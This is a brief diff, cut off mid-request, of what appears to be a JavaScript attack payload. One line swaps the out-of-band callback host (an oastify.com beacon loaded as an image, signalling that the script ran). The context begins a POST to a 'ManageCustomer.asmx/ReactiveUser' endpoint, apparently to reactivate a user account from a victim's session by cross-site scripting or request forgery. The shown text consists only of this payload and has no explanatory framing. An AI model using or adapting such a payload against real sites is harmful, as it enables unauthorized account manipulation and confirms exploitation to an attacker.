@@ -1,4 +1,4 @@
-var i=new Image; i.src="https://woofqtd0gp8c51iuv5scwmttyk4es4gt.oastify.com/";
+var i=new Image; i.src="https://00y1q322uivlldwo7uuqbm0d44avymmb.oastify.com/";
 
 fetch('/Home/ManageCustomer.asmx/ReactiveUser', {
     method: 'POST',
